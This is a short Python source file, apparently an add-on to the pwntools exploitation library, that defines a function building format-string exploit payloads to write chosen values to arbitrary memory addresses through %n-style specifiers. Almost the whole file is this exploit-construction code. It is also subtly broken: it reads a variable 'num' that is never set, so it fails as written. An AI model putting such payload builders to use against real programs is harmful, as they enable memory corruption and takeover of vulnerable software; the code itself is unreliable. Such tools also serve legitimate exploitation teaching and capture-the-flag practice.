#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

import logging
import re

from pwnlib.log import getLogger
from pwnlib.memleak import MemLeak
from pwnlib.util.cyclic import *
from pwnlib.util.fiddling import randoms
from pwnlib.util.packing import *

log = getLogger(__name__)

def fmtstr_payload(dic,offset,num_writen=0,write_size='byte',bit=64):
    """
    dic: a array of addr:value
    offset:buf distance from stack
    num_writen: number written
    write_size: 'byte', 'short', 'int'
    bit: 32,64
    """
    config = {
        32 : {
            'byte': (4, 1, 0xFF, 'hh', 8, 4 ,p32),
            'short': (2, 2, 0xFFFF, 'h', 16, 4,p32),
            'int': (1, 4, 0xFFFFFFFF, '', 32, 4,p32)},
        64 : {
            'byte': (8, 1, 0xFF, 'hh', 8, 8,p64),
            'short': (4, 2, 0xFFFF, 'h', 16, 8,p64),
            'int': (2, 4, 0xFFFFFFFF, '', 32, 8,p64)
        }
    }
    if write_size not in ['byte', 'short', 'int']:
        log.error("write_size must be 'byte', 'short' or 'int'")
    number, step, mask, formatz, decalage ,ptr_size,pack = config[bit][write_size]
    payload=""
    adds=""
    count=0
    for add,value in dic.iteritems():
        for i in range(number):
            adds+=pack(add+i*step)
            n=(value>>(i*decalage))&mask
            pad=(n-num)&mask
            if pad == 0:
                payload+="%{}$"+formatz+"n"
            else:
                payload+="%{}c".format(pad)+"%{}$"+formatz+"n"
            num=n
            count+=1
    length = (len(payload)+ptr_size-1)/ptr_size*ptr_size
    payload=payload.ljust(length,'\x00')+adds
    payload=payload.format(*[offset+length/ptr_size + i for i in range(count)])
    return payload

